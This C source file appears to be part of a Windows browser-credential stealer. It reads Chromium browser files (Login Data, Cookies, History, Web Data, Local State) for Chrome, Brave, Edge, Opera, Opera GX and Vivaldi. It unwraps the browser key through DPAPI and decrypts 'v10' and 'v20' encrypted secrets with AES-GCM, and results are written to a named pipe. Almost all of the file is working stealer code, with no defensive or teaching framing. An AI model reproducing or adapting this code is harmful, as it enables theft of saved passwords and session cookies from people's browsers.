#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitializeOutputPipe(OUT PHANDLE phPipe)
{
    if (!phPipe) return FALSE;
    if (*phPipe && *phPipe != INVALID_HANDLE_VALUE) return TRUE;

    CHAR szPipeName[BUFFER_SIZE_32] = { 0 };

    GetPipeName(szPipeName, BUFFER_SIZE_32);

    *phPipe = CreateFileA(szPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    return (*phPipe != INVALID_HANDLE_VALUE);
}

LPSTR BytesToHexString(IN PBYTE pbData, IN DWORD cbData)
{
    LPSTR   pszHexString    = NULL;
    DWORD   cchHexString    = 0x00;

    if (!pbData || cbData == 0)
        return NULL;

    cchHexString = (cbData * 2) + 1;

    if (!(pszHexString = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchHexString)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    for (DWORD i = 0; i < cbData; i++)
    {
        StringCchPrintfA(pszHexString + (i * 2), 3, "%02x", pbData[i]);
    }

    return pszHexString;
}

PBYTE DuplicateBuffer(IN PBYTE pbSrc, IN DWORD dwLen)
{
    PBYTE pbDst = NULL;

    if (!pbSrc || dwLen == 0)
        return NULL;

    if (!(pbDst = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    RtlCopyMemory(pbDst, pbSrc, dwLen);
    return pbDst;
}

LPSTR DuplicateAnsiString(IN LPCSTR pszSrc)
{
    SIZE_T  cchSrc = 0;
    SIZE_T  cbAlloc = 0;
    LPSTR   pszDst = NULL;

    if (!pszSrc) return NULL;

    cchSrc = (SIZE_T)lstrlenA(pszSrc);
    cbAlloc = (cchSrc + 1) * sizeof(CHAR);

    if (!(pszDst = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAlloc)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    StringCchCopyA(pszDst, cchSrc + 1, pszSrc);
    return pszDst;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{
    HANDLE  hFile       = INVALID_HANDLE_VALUE;
    DWORD   dwFileSize  = 0x00,
            dwBytesRead = 0x00;
    PBYTE   pbBuffer    = NULL;

    if (!pszFilePath || !ppFileBuffer || !pdwFileSize)
        return FALSE;

    *ppFileBuffer   = NULL;
    *pdwFileSize    = 0x00;

    if ((hFile = CreateFileA(pszFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateFileA Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE || dwFileSize == 0)
    {
        DBGA("[!] GetFileSize Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize + 1)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hFile, pbBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        DBGA("[!] ReadFile Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    *ppFileBuffer  = pbBuffer;
    *pdwFileSize   = dwBytesRead;

_END_OF_FUNC:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (pbBuffer && !*ppFileBuffer)
        HeapFree(GetProcessHeap(), 0x00, pbBuffer);
    return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue)
{
    CHAR    szSearchKey[BUFFER_SIZE_128]    = { 0 };
    LPCSTR  pszJsonEnd                      = NULL,
            pszKeyStart                     = NULL,
            pszValueStart                   = NULL,
            pszValueEnd                     = NULL;
    DWORD   dwKey                           = 0x00;

    if (!pszJson || !pszKey || !pcbValue)
        return NULL;

    *pcbValue   = 0;
    pszJsonEnd  = pszJson + cbJson;

    StringCbPrintfA(szSearchKey, sizeof(szSearchKey), "\"%s\"", pszKey);
    dwKey = (DWORD)lstrlenA(szSearchKey);

    pszKeyStart = pszJson;
    while (pszKeyStart < pszJsonEnd - dwKey)
    {
        pszKeyStart = (LPCSTR)memchr(pszKeyStart, '"', pszJsonEnd - pszKeyStart);
        if (!pszKeyStart)
            return NULL;

        if (memcmp(pszKeyStart, szSearchKey, dwKey) == 0)
            break;

        pszKeyStart++;
    }

    if (!pszKeyStart || pszKeyStart >= pszJsonEnd - dwKey)
        return NULL;

    pszKeyStart += dwKey;
    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != ':')
        return NULL;

    pszKeyStart++;

    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != '"')
        return NULL;

    pszValueStart = pszKeyStart + 1;

    pszValueEnd = pszValueStart;
    while (pszValueEnd < pszJsonEnd)
    {
        if (*pszValueEnd == '"' && *(pszValueEnd - 1) != '\\')
            break;

        pszValueEnd++;
    }

    if (pszValueEnd >= pszJsonEnd)
        return NULL;

    *pcbValue = (DWORD)(pszValueEnd - pszValueStart);
    return (LPSTR)pszValueStart;
}

BOOL FindJsonIntValue(IN LPCSTR pszJson, IN LPCSTR pszKey, OUT PINT64 pllValue)
{
    LPCSTR  pszKeyPos               = NULL;
    CHAR    szValue[BUFFER_SIZE_32] = { 0 };
    INT     i                       = 0;

    if (!pszJson || !pszKey || !pllValue)
        return FALSE;

    *pllValue = 0;

    if (!(pszKeyPos = StrStrA(pszJson, pszKey)))
        return FALSE;

    pszKeyPos += lstrlenA(pszKey);
    
    while (*pszKeyPos && (*pszKeyPos == ' ' || *pszKeyPos == ':' || *pszKeyPos == '\t'))
    {
        pszKeyPos++;
    }
    
    while (*pszKeyPos && ((*pszKeyPos >= '0' && *pszKeyPos <= '9') || *pszKeyPos == '-') && i < 31)
    {
        szValue[i++] = *pszKeyPos++;
    }

    if (i == 0) return FALSE;

    *pllValue = _atoi64(szValue);
    return TRUE;
}

LPSTR FindJsonArrayValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue)
{
    CHAR    szSearchKey[BUFFER_SIZE_128]    = { 0 };
    LPCSTR  pszJsonEnd                      = NULL;
    LPCSTR  pszKeyStart                     = NULL;
    LPCSTR  pszArrayStart                   = NULL;
    LPCSTR  pszArrayEnd                     = NULL;
    DWORD   dwKey                           = 0;
    INT     nBracketCount                   = 0;

    if (!pszJson || !pszKey || !pcbValue)
        return NULL;

    *pcbValue   = 0;
    pszJsonEnd  = pszJson + cbJson;

    StringCbPrintfA(szSearchKey, sizeof(szSearchKey), "\"%s\"", pszKey);
    dwKey = (DWORD)lstrlenA(szSearchKey);

    pszKeyStart = pszJson;
    while (pszKeyStart < pszJsonEnd - dwKey)
    {
        pszKeyStart = (LPCSTR)memchr(pszKeyStart, '"', pszJsonEnd - pszKeyStart);
        if (!pszKeyStart)
            return NULL;

        if (StrCmpNIA(pszKeyStart, szSearchKey, dwKey) == 0)
            break;

        pszKeyStart++;
    }

    if (!pszKeyStart || pszKeyStart >= pszJsonEnd - dwKey)
        return NULL;

    pszKeyStart += dwKey;

    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != ':')
        return NULL;

    pszKeyStart++;

    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != '[')
        return NULL;

    pszArrayStart = pszKeyStart + 1;
    pszArrayEnd = pszArrayStart;
    nBracketCount = 1;

    while (pszArrayEnd < pszJsonEnd && nBracketCount > 0)
    {
        if (*pszArrayEnd == '[') nBracketCount++;
        else if (*pszArrayEnd == ']') nBracketCount--;
        pszArrayEnd++;
    }

    if (nBracketCount != 0)
        return NULL;

    pszArrayEnd--;

    *pcbValue = (DWORD)(pszArrayEnd - pszArrayStart);
    return (LPSTR)pszArrayStart;
}

LPSTR FindNestedJsonValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszParentKey, IN LPCSTR pszChildKey, OUT PDWORD pcbValue)
{
    CHAR    szSearch[BUFFER_SIZE_128]   = { 0 };
    LPCSTR  pszJsonEnd                  = NULL,
            pszParent                   = NULL;
    DWORD   dwSearch                    = 0x00,
            dwRemaining                 = 0x00;

    if (!pszJson || !pszParentKey || !pszChildKey || !pcbValue)
        return NULL;

    *pcbValue   = 0x00;
    pszJsonEnd  = pszJson + cbJson;

    StringCbPrintfA(szSearch, sizeof(szSearch), "\"%s\"", pszParentKey);
    
    dwSearch = (DWORD)lstrlenA(szSearch);
    pszParent   = pszJson;

    while (pszParent < pszJsonEnd - dwSearch)
    {
        pszParent = (LPCSTR)memchr(pszParent, '"', pszJsonEnd - pszParent);
        if (!pszParent)
            return NULL;

        if (StrCmpNIA(pszParent, szSearch, dwSearch) == 0)
            break;

        pszParent++;
    }

    if (!pszParent || pszParent >= pszJsonEnd - dwSearch)
        return NULL;

#define MAX_NESTED_JSON_SEARCH 50000
    dwRemaining = (DWORD)(pszJsonEnd - pszParent);
    if (dwRemaining > MAX_NESTED_JSON_SEARCH)
        dwRemaining = MAX_NESTED_JSON_SEARCH;
#undef MAX_NESTED_JSON_SEARCH

    return FindJsonStringValue(pszParent, dwRemaining, pszChildKey, pcbValue);
}

LPSTR FindNestedJsonObject(IN LPCSTR pszJson, IN DWORD dwJson, IN LPCSTR pszKey, OUT PDWORD pdwObjectLen)
{
    LPCSTR  pszKeyStart     = NULL;
    LPCSTR  pszObjStart     = NULL;
    LPCSTR  pszCursor       = NULL;
    INT     nBraceCount     = 0;

    *pdwObjectLen = 0;

    if (!(pszKeyStart = StrStrA(pszJson, pszKey)))
        return NULL;

    pszCursor = pszKeyStart + lstrlenA(pszKey);

    while (pszCursor < pszJson + dwJson && *pszCursor != '{')
        pszCursor++;

    if (pszCursor >= pszJson + dwJson)
        return NULL;

    pszObjStart = pszCursor;
    nBraceCount = 1;
    pszCursor++;

    while (pszCursor < pszJson + dwJson && nBraceCount > 0)
    {
        if (*pszCursor == '{')
            nBraceCount++;
        else if (*pszCursor == '}')
            nBraceCount--;
        pszCursor++;
    }

    if (nBraceCount == 0)
    {
        *pdwObjectLen = (DWORD)(pszCursor - pszObjStart);
        return (LPSTR)pszObjStart;
    }

    return NULL;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
{
    PBYTE   pbOutput    = NULL;
    DWORD   dwOutput    = 0x00;

    if (!pszInput || cbInput == 0 || !pcbOutput) return NULL;

    *pcbOutput = 0;

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!(pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOutput)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        HEAP_FREE(pbOutput);
        return NULL;
    }

    *pcbOutput = dwOutput;
    return pbOutput;
}

BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted)
{
    DATA_BLOB   blobIn      = { 0 };
    DATA_BLOB   blobOut     = { 0 };

    if (!pBlob || dwBlob == 0 || !ppDecrypted || !pcbDecrypted)
        return FALSE;

    *ppDecrypted    = NULL;
    *pcbDecrypted   = 0;

    blobIn.pbData   = pBlob;
    blobIn.cbData   = dwBlob;

    if (!CryptUnprotectData(&blobIn, NULL, NULL, NULL, NULL, 0, &blobOut))
    {
        DBGA("[!] CryptUnprotectData Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    *ppDecrypted    = blobOut.pbData;
    *pcbDecrypted   = blobOut.cbData;

    return TRUE;
}

static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext)
{
    BCRYPT_ALG_HANDLE                       hAlg            = NULL;
    BCRYPT_KEY_HANDLE                       hKey            = NULL;
    PBYTE                                   pbPlaintext     = NULL;
    DWORD                                   dwPlaintext     = 0x00;
    ULONG                                   cbResult        = 0x00;
    NTSTATUS                                ntStatus        = 0x00;
    BOOL                                    bResult         = FALSE;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO   AuthInfo        = { 0 };

    if (!pbKey || !pbIv || !pbCiphertext || !pbTag || !ppbPlaintext || !pcbPlaintext)
        return FALSE;

    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0)
    {
        DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, cbKey, 0)) != 0)
    {
        DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
    AuthInfo.pbNonce    = pbIv;
    AuthInfo.cbNonce    = cbIv;
    AuthInfo.pbTag      = pbTag;
    AuthInfo.cbTag      = cbTag;

    dwPlaintext         = cbCiphertext;

    if (!(pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPlaintext + 1)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, &AuthInfo, NULL, 0, pbPlaintext, dwPlaintext, &cbResult, 0)) != 0)
    {
        DBGA("[!] BCryptDecrypt Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    *ppbPlaintext   = pbPlaintext;
    *pcbPlaintext   = (DWORD)cbResult;
    pbPlaintext     = NULL; // Important
    bResult         = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbPlaintext);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

BOOL DecryptChromiumV10Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret)
{
    PBYTE   pbIv            = NULL;
    PBYTE   pbCiphertext    = NULL;
    PBYTE   pbTag           = NULL;
    DWORD   cbCiphertext    = 0x00;
    DWORD   cbMinSize       = CHROMIUM_V10_PREFIX_SIZE + AES_GCM_IV_SIZE + AES_GCM_TAG_SIZE;

    if (!pbKey || !pbEncryptedSecret || !ppbDecryptedSecret || !pcbDecryptedSecret)
        return FALSE;

    *ppbDecryptedSecret = NULL;
    *pcbDecryptedSecret = 0;

    // Verify V10 Secret
    if (cbEncryptedSecret < cbMinSize || (*(PDWORD)pbEncryptedSecret & 0x00FFFFFF) != CHROMIUM_V10_PREFIX)
    {
        DBGA("[!] Invalid V10 Secret, Prefix: 0x%06X, Length: %lu bytes", (*(PDWORD)pbEncryptedSecret & 0x00FFFFFF), cbEncryptedSecret);
        return FALSE;
    }
    
    // Parse structure: [v10 (3)] [IV (12)] [Ciphertext (N)] [Tag (16)]
    pbIv            = pbEncryptedSecret + CHROMIUM_V10_PREFIX_SIZE;
    cbCiphertext    = cbEncryptedSecret - CHROMIUM_V10_PREFIX_SIZE - AES_GCM_IV_SIZE - AES_GCM_TAG_SIZE;
    pbCiphertext    = pbIv + AES_GCM_IV_SIZE;
    pbTag           = pbCiphertext + cbCiphertext;

    return DecryptAesGcm(pbKey, cbKey, pbIv, AES_GCM_IV_SIZE, pbCiphertext, cbCiphertext, pbTag, AES_GCM_TAG_SIZE, ppbDecryptedSecret, pcbDecryptedSecret);
}

BOOL DecryptChromiumV20Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret)
{
    PBYTE   pbIv            = NULL;
    PBYTE   pbCiphertext    = NULL;
    PBYTE   pbTag           = NULL;
    DWORD   cbCiphertext    = 0x00;
    DWORD   cbMinSize       = CHROMIUM_V20_PREFIX_SIZE + AES_GCM_IV_SIZE + AES_GCM_TAG_SIZE;

    if (!pbKey || !pbEncryptedSecret || !ppbDecryptedSecret || !pcbDecryptedSecret)
        return FALSE;

    // Verify V20 Secret
    if (cbEncryptedSecret <= cbMinSize || (*(PDWORD)pbEncryptedSecret & 0x00FFFFFF) != CHROMIUM_V20_PREFIX)
    {
        DBGA("[!] Invalid V20 Secret, Prefix: 0x%06X, Length: %lu bytes", (*(PDWORD)pbEncryptedSecret & 0x00FFFFFF), cbEncryptedSecret);
        return FALSE;
    }

    // Parse structure: [v20 (3)] [IV (12)] [Ciphertext (N)] [Tag (16)]
    pbIv            = pbEncryptedSecret + CHROMIUM_V20_PREFIX_SIZE;
    cbCiphertext    = cbEncryptedSecret - CHROMIUM_V20_PREFIX_SIZE - AES_GCM_IV_SIZE - AES_GCM_TAG_SIZE;
    pbCiphertext    = pbIv + AES_GCM_IV_SIZE;
    pbTag           = pbCiphertext + cbCiphertext;

    return DecryptAesGcm(pbKey, cbKey, pbIv, AES_GCM_IV_SIZE, pbCiphertext, cbCiphertext, pbTag, AES_GCM_TAG_SIZE, ppbDecryptedSecret, pcbDecryptedSecret);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Getters

// Works For All Browsers
LPCSTR GetBrowserName(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_BRSR_NAME;
        case BROWSER_BRAVE:     return STR_BRAVE_BRSR_NAME;
        case BROWSER_EDGE:      return STR_EDGE_BRSR_NAME;
        case BROWSER_OPERA:     return STR_OPERA_BRSR_NAME;
        case BROWSER_OPERA_GX:  return STR_OPERA_GX_BRSR_NAME;
        case BROWSER_FIREFOX:   return STR_FIREFOX_BRSR_NAME;
        case BROWSER_VIVALDI:   return STR_VIVALDI_BRSR_NAME;
        default:                return STR_UNKNOWN_BRSR_NAME;
    }
}

// This is only used for the process enumeration logic.
// The only difference is that it returns STR_OPERA_BRSR_NAME: 'Opera'
// For both Opera and Opera GX
// Works For All Browsers
LPCSTR GetBrowserProcessName(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return STR_CHROME_BRSR_NAME;
        case BROWSER_BRAVE:     return STR_BRAVE_BRSR_NAME;
        case BROWSER_EDGE:      return STR_EDGE_BRSR_NAME;
        case BROWSER_OPERA_GX:
        case BROWSER_OPERA:     return STR_OPERA_BRSR_NAME;
        case BROWSER_FIREFOX:   return STR_FIREFOX_BRSR_NAME;
        case BROWSER_VIVALDI:   return STR_VIVALDI_BRSR_NAME;
        default:                return STR_UNKNOWN_BRSR_NAME;
    }
}

// The following getters are Chromium-only because Firefox stores its data files
// inside a dynamic profile folder (e.g., Mozilla\Firefox\Profiles\xxxxxxxx.default-release\)
// that must be resolved at runtime

// Chromium Only
static LPCSTR GetChromiumBrowserBasePath(IN BROWSER_TYPE Browser)
{
    switch (Browser)
    {
        case BROWSER_CHROME:    return CHROME_BASE_PATH;
        case BROWSER_BRAVE:     return BRAVE_BASE_PATH;
        case BROWSER_EDGE:      return EDGE_BASE_PATH;
        case BROWSER_OPERA:     return OPERA_BASE_PATH;
        case BROWSER_OPERA_GX:  return OPERAGX_BASE_PATH;
        case BROWSER_VIVALDI:   return VIVALDI_BASE_PATH;
        default:                return NULL;
    }
}

// Chromium Only
static LPCSTR GetChromiumFileSuffix(IN BROWSER_FILE_TYPE FileType)
{
    switch (FileType)
    {
        case FILE_TYPE_WEB_DATA:    return SUFFIX_WEB_DATA;
        case FILE_TYPE_HISTORY:     return SUFFIX_HISTORY;
        case FILE_TYPE_COOKIES:     return SUFFIX_COOKIES;
        case FILE_TYPE_LOGIN_DATA:  return SUFFIX_LOGIN_DATA;
        case FILE_TYPE_BOOKMARKS:   return SUFFIX_BOOKMARKS;
        case FILE_TYPE_LOCAL_STATE: return SUFFIX_LOCAL_STATE;
        default:                    return NULL;
    }
}

// Chromium Only
BOOL GetChromiumBrowserFilePath(IN BROWSER_TYPE Browser, IN BROWSER_FILE_TYPE FileType, OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    LPCSTR pszBasePath  = GetChromiumBrowserBasePath(Browser);
    LPCSTR pszSuffix    = GetChromiumFileSuffix(FileType);
    BOOL   bResult      = FALSE;

    if (!pszBasePath || !pszSuffix || !pszBuffer)
        return FALSE;

    if (FAILED(StringCchCopyA(pszBuffer, dwBufferSize, pszBasePath)))
        goto _END_OF_FUNC;

    if (FAILED(StringCchCatA(pszBuffer, dwBufferSize, pszSuffix)))
        goto _END_OF_FUNC;

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult) *pszBuffer = '\0';
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
